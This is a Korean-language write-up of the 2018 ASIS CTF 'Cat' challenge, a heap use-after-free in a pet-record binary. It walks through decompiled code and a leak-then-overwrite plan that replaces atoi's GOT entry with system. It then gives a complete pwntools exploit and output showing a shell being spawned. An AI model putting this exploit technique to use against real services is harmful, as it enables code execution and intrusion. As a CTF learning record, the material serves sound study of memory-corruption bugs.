# \[2018 ASIS CTF] \[Web] Cat
## Keywords
- Heap Use After Free

## Checksec
```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## Solution

프로그램의 기능은 create, edit, print\_one, print\_all, delete_one으로 총 5가지입니다. 

pet 구조체는 다음과 같습니다.

```c
struct pet
{
  char *name;
  char *kind;
  int age;
};
```

버그는 `edit` 함수에서 발생합니다. 

```c
__int64 edit_400B74()
{
  __int64 result; // rax
  pet *now; // rbx MAPDST
  char *name; // rsi
  int length; // ST0C_4 MAPDST
  char *nname; // ST10_8
  char *kind; // ST18_8
  unsigned int idx; // [rsp+8h] [rbp-48h]
  char buf; // [rsp+20h] [rbp-30h]
  unsigned __int64 v11; // [rsp+38h] [rbp-18h]

  v11 = __readfsqword(0x28u);
  idx = get_id_40090F();
  if ( idx == -1 )
  {
    puts("Invalid id! (=+_+=)");
    result = 0LL;
  }
  else if ( pet_list[idx] )
  {
    if ( !new_pet )
    {
      new_pet = (pet *)malloc(0x18uLL);
      now = new_pet;
      now->name = (char *)malloc(0x17uLL);
      now = new_pet;
      now->kind = (char *)malloc(0x17uLL);
    }
    printf("What's the pet's name?\n> ");
    name = new_pet->name;
    length = read(0, new_pet->name, 0x16uLL);
    new_pet->name[length - 1] = 0;
    printf("What's the pet's kind?\n> ", name);
    length = read(0, new_pet->kind, 0x16uLL);
    new_pet->kind[length - 1] = 0;
    printf("How old?\n> ");
    read(0, &buf, 4uLL);
    now = new_pet;
    *(_QWORD *)&now->age = atoi(&buf);
    printf("Would you modify? (y)/n> ", &buf);
    read(0, &buf, 4uLL);
    if ( buf == 'n' )
    {
      nname = new_pet->name;
      kind = new_pet->kind;
      free(new_pet);
      free(nname);
      free(kind);
    }
    else
    {
      free(pet_list[idx]->name);
      free(pet_list[idx]->kind);
      free(pet_list[idx]);
      pet_list[idx] = new_pet;
      new_pet = 0LL;
      printf("edit id %d\n", idx);
    }
    result = 0LL;
  }
  else
  {
    puts("Invalid id! (=+_+=)");
    result = 0LL;
  }
  return result;
}
```

`new_pet` 전역변수가 사용되는데, uninitialized variable 버그로 이용될 가능성이 있습니다. n을 입력하면 `new_pet`이 free되지만 초기화되지 않고 dangling pointer로 남기 때문입니다. 우선 이 부분은 잠시 킵해두고 다른 것을 분석해봅시다. 

edit에서 새로운 청크를 만들 때 힙할당 순서는 다음과 같습니다.
1. pet
2. name
3. kind

힙 해제 시에는 yn의 값에 따라 크게 두 가지로 나뉩니다.(이 순서가 uaf에 이용되기 때문에 잘 알고 있어야 합니다.)

n일 경우
1. pet
2. name
3. kind

y일 경우
1. name
2. kind
3. pet



이제 create 함수를 봅시다.

```c
__int64 create_400996()
{
  pet *now_pet; // rbx MAPDST
  unsigned int last_index; // [rsp+4h] [rbp-3Ch]
  signed int i; // [rsp+8h] [rbp-38h]
  char age; // [rsp+10h] [rbp-30h]
  unsigned __int64 canary; // [rsp+28h] [rbp-18h]

  canary = __readfsqword(0x28u);
  last_index = -1;
  for ( i = 0; i <= 9; ++i )
  {
    if ( !pet_list[i] )
    {
      last_index = i;
      break;
    }
  }
  if ( last_index == -1 )
  {
    puts("records is full! (=+_+=)");
  }
  else
  {
    pet_list[last_index] = (pet *)malloc(0x18uLL);
    now_pet = pet_list[last_index];
    now_pet->name = (char *)malloc(0x17uLL);
    now_pet = pet_list[last_index];
    now_pet->kind = (char *)malloc(0x17uLL);
    printf("What's the pet's name?\n> ");
    pet_list[last_index]->name[(signed int)read(0, pet_list[last_index]->name, 0x16uLL) - 1] = 0;
    printf("What's the pet's kind?\n> ");
    pet_list[last_index]->kind[(signed int)read(0, pet_list[last_index]->kind, 0x16uLL) - 1] = 0;
    printf("How old?\n> ");
    read(0, &age, 4uLL);
    now_pet = pet_list[last_index];
    *(_QWORD *)&now_pet->age = atoi(&age);
    printf("create record id:%d\n", last_index);
  }
  return 0LL;
}
```

`create` 함수에서 힙 할당 순서는 다음과 같습니다.
1. pet
2. name
3. kind

이제 공격 시나리오를 대충 생각해봅시다.

edit에서 n을 입력하여 해제하고 create를 통해 청크를 생성한다면 edit에서 kind, name, pet으로 사용되던 영역이 순서대로 pet, name, kind로 사용됩니다.

그 후 다시 edit을 실행한다면 dangling pointer로 남아있던 `new_pet` 때문에 create를 통해 생성한 kind 영역이 edit에서는 pet 구조체로서 인식됩니다. 따라서 arbitrary write가 가능합니다.

시나리오를 구체적으로 다시 정리해봅시다.

1. pet(idx0) 생성.
2. edit(n) 실행.
3. pet(idx1) 생성. 이 때 kind의 값에 pet\_list 주소를 입력.
4. edit(y) 실행. name과 kind에 printf의 got를 입력. 그러면 idx0 pet 구조체에 printf got가 write됨.
5. idx0 print. printf 주소 값 leak.
6. 위 과정을 반복하여 이번엔 printf 대신 atoi 주소도 leak.
7. libc database로 system 주소 오프셋을 구함.
8. atoi got에 system 주소를 overwrite

## Exploit Code

```python
from pwn import *
import sys

def create(name, kind, age):
    p.sendafter("which command?\n> ", "0001")
    p.sendafter("What's the pet's name?\n> ", name)
    p.sendafter("What's the pet's kind?\n> ", kind)
    p.sendafter("How old?\n> ", str(age).rjust(4,"0"))

def edit(idx, name, kind, age, yn):
    p.sendafter("which command?\n> ", "0002")
    p.sendafter("which id?\n> ", str(idx).rjust(4,"0"))
    p.sendafter("What's the pet's name?\n> ", name)
    p.sendafter("What's the pet's kind?\n> ", kind)
    p.sendafter("How old?\n> ", str(age).rjust(4,"0"))
    p.sendafter("Would you modify? (y)/n> ", yn.ljust(4,"\x00"))

def print_one(idx):
    global pname, pkind, pold
    p.sendafter("which command?\n> ", "0003")
    p.sendafter("which id?\n> ", str(idx).rjust(4,"0"))
    p.recvuntil("name: ")
    pname = p.recvline()[:-1]
    p.recvuntil("kind: ")
    pkind = p.recvline()[:-1]
    p.recvuntil("old: ")
    pold = p.recvline()[:-1]


def print_all():
    p.sendafter("which command?\n> ", "0004")
    print p.recvuntil("print all: \n")

def delete_one(idx):
    p.sendafter("which command?\n> ", "0005")
    p.sendafter("which id?\n> ", str(idx).rjust(4,"0"))


if len(sys.argv) == 1:
    p = process("./Cat")
else:
    remote("178.62.40.102", 6000)

atoi_got = 0x602068
printf_got = 0x602038
pet_list = 0x6020A0


# round 1. leak printf address
create("0000","0000","0")
edit(0, "aaaa","aaaa","aaaa","n")

to_write = pet_list
payload = p64(to_write) * 2 + "a" 
create("1111", payload, "1")
create("2222", "2222", "2")
create("3333", "3333", "3")
edit(3, p64(pet_list),p64(printf_got-16),"4", "y")
print_one(0)
printf = int(pold)
log.info("printf = 0x%x" % printf)
create("4444","4444","4")

# round 2. leak atoi address
"""
create("5555","5555","5")
edit(4, "aaaa","aaaa","aaaa","n")

to_write = pet_list
payload = p64(to_write) * 2 + "a"
create("6666", payload, "1")
create("7777", "2222", "2")
create("8888", "3333", "3")
edit(1, p64(pet_list),p64(atoi_got-16),"4", "y")
print_one(0)
atoi = int(pold)
log.info("atoi = 0x%x" % atoi)
"""

# round 3. using libc database, we can get offset of system.
# overwrite the atoi with system
system = printf	- 0x10470	# it is my local offset.
log.info("system : 0x%x" % system)
create("5555","5555","5")
edit(4, "aaaa","aaaa","aaaa","n")

to_write = atoi_got
payload = p64(to_write) * 2 + "a"
create("6666", payload, "1")
create("7777", "2222", "2")
create("8888", "3333", "3")
edit(8, p64(pet_list),p64(system),"4", "y")

p.interactive()
```

## Result
```
$ python ex.py 
[+] Starting local process './Cat': pid 28139
[*] printf = 0x7ffff7a62800
[*] system : 0x7ffff7a52390
[*] Switching to interactive mode
edit id 8
------------------------------------------------
 1: create pet record
 2: edit pet record
 3: print record
 4: print all record
 5: delete record
 6: exit
------------------------------------------------
which command?
> $ sh
$ id
uid=1000(delspon) gid=1000(delspon) groups=1000(delspon),33(www-data)
```